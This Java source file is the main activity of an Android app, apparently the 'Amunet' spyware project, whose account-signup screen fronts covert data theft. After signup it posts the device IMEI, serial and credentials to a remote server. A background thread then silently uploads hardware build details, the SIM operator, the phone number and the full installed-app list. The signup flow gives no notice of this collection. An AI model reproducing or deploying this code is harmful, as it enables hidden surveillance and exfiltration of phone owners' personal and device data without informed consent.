package org.a0x00sec.amunet;

import android.Manifest;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    EditText username, password, name;
    Button create_account_button;

    SharedPreferences sharedPreferences;

    private static final int READ_PHONE_STATE_REQUEST_CODE = 10001;

    ProgressDialog progressDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sharedPreferences = getSharedPreferences("Auth", Context.MODE_PRIVATE);

        final String auth_key = sharedPreferences.getString("auth_key", null);

        if(auth_key != null) {
            startActivity(new Intent(MainActivity.this, Dashboard.class));
            finish();
        }

        username = findViewById(R.id.username);
        password = findViewById(R.id.password);
        name = findViewById(R.id.full_name);

        create_account_button = findViewById(R.id.create_account_button);
        create_account_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE)
                        != PackageManager.PERMISSION_GRANTED) {
                    show_permission_alert("Allow the app to read the phone's information", "read_phone_state");
                } else {

                    if(username.getText().toString().length() < 5) {
                        show_alert("Username must be more than 5 characters");
                        return;
                    }

                    if(password.getText().toString().length() < 5) {
                        show_alert("Password must be more than 5 characters");
                        return;
                    }

                    if(name.getText().toString().length() < 3) {
                        show_alert("Enter a valid name");
                        return;
                    }

                    create_phone_account();
                }
            }
        });
    }

    protected String getDeviceIMEI() {
        String deviceUniqueIdentifier = null;
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if (null != tm) {
            try {
                deviceUniqueIdentifier = tm.getDeviceId();
            } catch (SecurityException e) {
                return null;
            }
        }
        if (null == deviceUniqueIdentifier || 0 == deviceUniqueIdentifier.length()) {
            deviceUniqueIdentifier = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        return deviceUniqueIdentifier;
    }

    private void create_phone_account() {

        progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.setMessage("Creating account ...");
        progressDialog.setCancelable(false);
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.show();

        final String phone_imei = getDeviceIMEI();
        final String phone_serial = Build.SERIAL;

        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {

                try {

                    final JSONObject response = new JSONObject(req);

                    if(response.getBoolean("success")) {
                        final String server_response = response.getString("response");

                        SharedPreferences.Editor editor = sharedPreferences.edit();

                        editor.putString("auth_key", response.getString("api_key"));

                        editor.apply();

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                collect_phone_details();
                                collect_installed_apps();
                            }
                        }).start();

                        new CountDownTimer(6000,1000) {
                            @Override
                            public void onTick(long l) {

                            }

                            @Override
                            public void onFinish() {
                                username.setText("");
                                password.setText("");
                                name.setText("");

                                progressDialog.dismiss(); // New line of code

                                startActivity(new Intent(MainActivity.this, Dashboard.class));
                                finish();
                            }
                        }.start();
                    } else {
                        show_alert(response.getString("response"));
                        progressDialog.dismiss(); // New line of code
                    }
                } catch (Exception e) {
                    show_alert("Authentication error: " + e.getMessage());
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                progressDialog.dismiss();
                show_alert("Internet disconnected");
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("imei", phone_imei);
                params.put("serial", phone_serial);
                params.put("user", username.getText().toString());
                params.put("name", name.getText().toString());
                params.put("pass", password.getText().toString());
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

    private void collect_phone_details() {
        upload_detail("VERSION.RELEASE", Build.VERSION.RELEASE);
        upload_detail("VERSION.INCREMENTAL", Build.VERSION.INCREMENTAL);
        upload_detail("VERSION.SDK.NUMBER", String.valueOf(Build.VERSION.SDK_INT));
        upload_detail("BOARD", Build.BOARD);
        upload_detail("BOOTLOADER", Build.BOOTLOADER);
        upload_detail("BRAND", Build.BRAND);
        upload_detail("CPUABI", Build.CPU_ABI);
        upload_detail("CPUABI2", Build.CPU_ABI2);
        upload_detail("DISPLAY", Build.DISPLAY);
        upload_detail("FINGERPRINT", Build.FINGERPRINT);
        upload_detail("HARDWARE", Build.HARDWARE);
        upload_detail("HOST", Build.HOST);
        upload_detail("ID", Build.ID);
        upload_detail("MANUFACTURER", Build.MANUFACTURER);
        upload_detail("MODEL",Build.MODEL);
        upload_detail("PRODUCT", Build.PRODUCT);
        upload_detail("SERIAL", Build.SERIAL);
        upload_detail("TAGS", Build.TAGS);
        upload_detail("TIME", String.valueOf(Build.TIME));
        upload_detail("TYPE", Build.TYPE);
        upload_detail("UNKNOWN",Build.UNKNOWN);
        upload_detail("USER", Build.USER);
        upload_detail("DEVICE", Build.DEVICE);

        TelephonyManager telephonyManager = ((TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        String simOperatorName = telephonyManager.getSimOperatorName();
        String simNumber = "";

        try {
            simNumber = telephonyManager.getLine1Number();
        } catch (SecurityException e) {
        }

        upload_detail("SIM1.OPERATOR", simOperatorName);
        upload_detail("SIM1.PHONE", simNumber);
    }

    private void upload_detail(final String key, final String value) {
        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        final String auth_key = sharedPreferences.getString("auth_key", null);

        if(auth_key == null) { return; }

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("auth", auth_key);
                params.put("k", key);
                params.put("v", value);
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

    private void show_permission_alert(String message, final String permission) {
        AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
        dialog.setMessage(message);
        dialog.setCancelable(false);
        dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                if(permission.toLowerCase().equals("read_phone_state")) {
                    ActivityCompat.requestPermissions(MainActivity.this,
                            new String[] {Manifest.permission.READ_PHONE_STATE},
                            READ_PHONE_STATE_REQUEST_CODE);
                }
            }

        });
        dialog.show();
    }

    protected void show_alert(String msg) {
        AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
        dialog.setMessage(msg);
        dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }

        });
        dialog.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case READ_PHONE_STATE_REQUEST_CODE: {
                if (grantResults.length > 0
                        && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), "Without this permission, the desired action cannot be performed", Toast.LENGTH_LONG).show();
                } else {
                    create_phone_account();
                }
            }
        }
    }

    private void collect_installed_apps() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null)
            {
                try {
                    String app_name = packageInfo.loadLabel(getPackageManager()).toString();
                    String app_package = packageInfo.processName;
                    String app_uid = Integer.toString(packageInfo.uid);
                    String app_versionName = pm.getPackageInfo(app_package, 0).versionName.toString();
                    String app_versionCode = String.valueOf(pm.getPackageInfo(app_package, 0).versionCode);

                    upload_app(app_name, app_package, app_uid, app_versionName, app_versionCode);
                } catch (Exception e) {
                }
            }
        }
    }

    private void upload_app(final String app_name, final String app_package, final String app_uid, final String app_vName, final String app_vCode) {
        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        final String auth_key = sharedPreferences.getString("auth_key", null);

        if(auth_key == null) { return; }

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("auth", auth_key);
                params.put("app_name", app_name);
                params.put("app_package", app_package);
                params.put("app_uid", app_uid);
                params.put("app_vname", app_vName);
                params.put("app_vcode", app_vCode);
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

}
